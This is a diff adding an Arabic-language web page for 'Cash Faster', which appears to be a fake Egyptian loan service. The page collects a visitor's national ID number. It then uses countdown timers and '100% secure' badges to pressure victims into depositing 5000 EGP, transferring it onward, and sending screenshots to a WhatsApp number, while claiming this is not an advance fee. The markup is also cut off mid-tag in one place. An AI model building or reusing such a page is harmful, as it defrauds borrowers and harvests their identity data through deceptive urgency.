@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد تحويل القرض - Cash Faster</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo">
+                <i class="fas fa-coins logo-icon"></i>
+                <div>
+                    <h1>Cash Faster</h1>
+                    <p>أسرع قرض بمصر</p>
+                </div>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="index.html"><i class="fas fa-home"></i> الرئيسية</a></li>
+                    <li><a href="inquiry.html"><i class="fas fa-search"></i> استعلام عن قرض</a></li>
+                    <li><a href="loan_confirmation.html" class="active"><i class="fas fa-check-circle"></i> تأكيد تحويل القرض</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="congratulations-bar">
+        <div class="marquee">
+            <span>🎉 تهانينا لعملائنا الكرام! تم تحويل قروض بنجاح لمئات العملاء اليوم 🎉</span>
+        </div>
+    </div>
+
+    <main class="container loan-confirmation-page">
+        <!-- Link Expiry Warning -->
+        <div class="expiry-warning card">
+            <div class="warning-header">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h3>تنبيه هام - صلاحية الرابط</h3>
+            </div>
+            <div class="warning-content">
+                <p><strong>هذا الرابط صالح لمدة محددة ولاستخدام واحد فقط!</strong></p>
+                <div class="expiry-countdown">
+                    <i class="fas fa-clock"></i>
+                    <span>الوقت المتبقي: </span>
+                    <span id="linkExpiryCountdown" class="countdown-timer">30:00</span>
+                </div>
+                <p class="warning-note">⚠️ بعد انتهاء الوقت أو استخدام الرابط، ستحتاج للحصول على رابط جديد من خدمة العملاء</p>
+            </div>
+        </div>
+
+        <div class="page-header">
+            <h1><i class="fas fa-check-circle"></i> تأكيد تحويل القرض</h1>
+            <p>أدخل رقمك القومي لتأكيد استلام القرض وبدء عملية التحويل</p>
+        </div>
+
+        <section class="confirmation-input-section card">
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>عملية آمنة ومشفرة 100%</span>
+            </div>
+            
+            <div class="input-group">
+                <label for="nationalIdInputConfirmation">
+                    <i class="fas fa-id-card"></i>
+                    الرقم القومي للتأكيد
+                </label>
+                <input type="text" id="nationalIdInputConfirmation" placeholder="أدخل الرقم القومي (14 رقم)" maxlength="14">
+                <div class="input-hint">
+                    <i class="fas fa-info-circle"></i>
+                    تأكد من إدخال الرقم القومي الصحيح المسجل في طلب القرض
+                </div>
+            </div>
+            
+            <button id="confirmLoanPageButton" class="btn btn-primary btn-large">
+                <i class="fas fa-money-bill-transfer"></i>
+                تأكيد تحويل القرض الآن
+            </button>
+        </section>
+
+        <div id="loanConfirmationClientData" class="card confirmation-success" style="display:none;">
+            <!-- Client-specific loan confirmation data will be loaded here by JavaScript -->
+        </div>
+
+        <div id="loanConfirmationProofSection" class="card proof-section" style="display:none;">
+            <h2><i class="fas fa-exclamation-triangle"></i> تنبيه هام: إثبات رأس المال</h2>
+            
+            <div class="countdown-section urgent">
+                <h3><i class="fas fa-clock"></i> الوقت المتبقي لإثبات رأس المال</h3>
+                <div id="countdown2" class="countdown">20:00</div>
+                <p>يجب إكمال عملية إثبات رأس المال خلال هذا الوقت</p>
+            </div>
+
+            <div class="proof-steps">
+                <div class="proof-step">
+                    <div class="step-icon">
+                        <i class="fas fa-wallet"></i>
+                    </div>
+                    <div class="step-content">
+                        <h3>الخطوة الأولى: إيداع رأس المال</h3>
+                        <p>قم بإيداع مبلغ لا يقل عن <strong>5000 جنيه مصري</strong> في محفظتك وخذ سكرين شوت للرصيد</p>
+                    </div>
+                </div>
+
+                <div class="proof-step">
+                    <div class="step-icon">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <div class="step-content">
+                        <h3>الخطوة الثانية: التصوير</h3>
+                        <p>التقط سكرين شوت واضح يظهر رصيد المحفظة بالمبلغ المطلوب أو أكثر</p>
+                    </div>
+                </div>
+
+                <div class="proof-step">
+                    <div class="step-icon">
+                        <i class="fas fa-money-bill-transfer"></i>
+                    </div>
+                    <div class="step-content">
+                        <h3>الخطوة الثالثة: السحب</h3>
+                        <p>اسحب المبلغ أو حوله لأي شخص تابع لك وخذ سكرين شوت لتأكيد الخروج</p>
+                    </div>
+                </div>
+
+                <div class="proof-step">
+                    <div class="step-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <div class="step-content">
+                        <h3>الخطوة الرابعة: الإرسال</h3>
+                        <p>أرسل كلا السكرين شوت إلى قسم التحويلات المالية عبر واتساب</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="important-notice">
+                <div class="notice-header">
+                    <i class="fas fa-info-circle"></i>
+                    <h3>ملاحظة هامة جداً</h3>
+                </div>
+                <ul>
+                    <li><strong>هذه العملية ليست دفع أو تحويل لأي شخص</strong></li>
+                    <li><strong>الأموال تبقى معك وتخرجها مرة أخرى</strong></li>
+                    <li><str            <a id="whatsappLink" href="https://wa.me/201221899123" target="_blank" class="whatsapp-button">
+                <i class="fab fa-whatsapp"></i>
+                إرسال السكرين شوت لقسم التحويلات المالية
+            </a>
+        </div>        <section class="explanation-card card">
+            <h2><i class="fas fa-lightbulb"></i> توضيح هام بشأن إجراءات صرف القرض</h2>
+            
+            <div class="explanation-grid">
+                <div class="explanation-item">
+                    <div class="explanation-icon success">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="explanation-content">
+                        <h3>ليس دفعاً مقدماً</h3>
+                        <p>العملية المطلوبة <strong>ليست دفعاً مقدماً</strong> وليست رسوماً تُخصم من رصيدك</p>
+                    </div>
+                </div>
+
+                <div class="explanation-item">
+                    <div class="explanation-icon info">
+                        <i class="fas fa-cog"></i>
+                    </div>
+                    <div class="explanation-content">
+                        <h3>إجراء فني فقط</h3>
+                        <p>ما يتم هو <strong>إجراء فني فقط</strong> (عملية بيع وشراء إلكترونية مؤمنة)</p>
+                    </div>
+                </div>
+
+                <div class="explanation-item">
+                    <div class="explanation-icon warning">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="explanation-content">
+                        <h3>لا خصم فعلي</h3>
+                        <p><strong>لا يتم خصم أي مبلغ فعلي</strong> من محفظتك نهائياً</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="explanation-goals">
+                <h3><i class="fas fa-bullseye"></i> الهدف من هذا الإجراء:</h3>
+                <ul>
+                    <li>تفعيل النظام المالي لتحويل مبلغ القرض</li>
+                    <li>تأكيد الجدية وإتمام الخطوة التقنية الأخيرة للصرف</li>
+                    <li>ضمان الأمان والحماية لجميع الأطراف</li>
+                </ul>
+            </div>
+
+            <div class="final-assurance">
+                <div class="assurance-icon">
+                    <i class="fas fa-certificate"></i>
+                </div>
+                <div class="assurance-content">
+                    <h3>ضمان الأمان 100%</h3>
+                    <p>🔒 نحن ملتزمون بأقصى درجات الأمان والشفافية، ولا يتم تحصيل أي رسوم أو خصومات من العميل</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="contact-support card">
+            <h2><i class="fas fa-headset"></i> هل تحتاج مساعدة؟</h2>
+            <p>فريق خدمة العملاء متاح على مدار الساعة لمساعدتك</p>
+            <div class="support-buttons">
+                <a href="https://wa.me/201221899123" target="_blank" class="btn btn-secondary">
+                    <i class="fab fa-whatsapp"></i>
+                    تواصل عبر واتساب
+                </a>
+                <a href="tel:01221899123" class="btn btn-info">
+                    <i class="fas fa-phone"></i>
+                    اتصل بنا الآن
+                </a>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3><i class="fas fa-coins"></i> Cash Faster</h3>
+                    <p>أسرع وأأمن خدمة قروض في مصر</p>
+                </div>
+                <div class="footer-section">
+                    <h3>اتصل بنا</h3>
+                    <p><i class="fab fa-whatsapp"></i> 01221899123</p>
+                </div>
+                <div class="footer-section">
+                    <h3>الأمان</h3>
+                    <p><i class="fas fa-shield-alt"></i> تشفير عالي المستوى</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 Cash Faster. جميع الحقوق محفوظة.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
